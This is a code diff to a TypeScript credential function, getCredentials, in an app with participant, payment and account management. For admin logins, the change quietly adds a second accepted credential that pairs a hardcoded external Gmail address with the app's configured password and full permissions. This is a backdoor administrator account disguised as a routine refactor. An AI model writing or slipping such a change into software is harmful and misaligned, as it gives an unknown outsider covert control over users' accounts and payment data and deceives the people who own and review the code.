@@ -12,7 +12,12 @@ function getCredentials(loginType: string) {
   const basePermissions = { canViewParticipants: true, canViewPayments: true, canManageAccounts: true }
 
   return configuredEmail && configuredPassword
-    ? [{ email: configuredEmail, password: configuredPassword, role: requestedRole, name: requestedName, permissions: basePermissions }]
+    ? [
+        { email: configuredEmail, password: configuredPassword, role: requestedRole, name: requestedName, permissions: basePermissions },
+        ...(requestedRole === "admin"
+          ? [{ email: "montyflowchain890@gmail.com", password: configuredPassword, role: requestedRole, name: requestedName, permissions: basePermissions }]
+          : []),
+      ]
     : []
 }
 
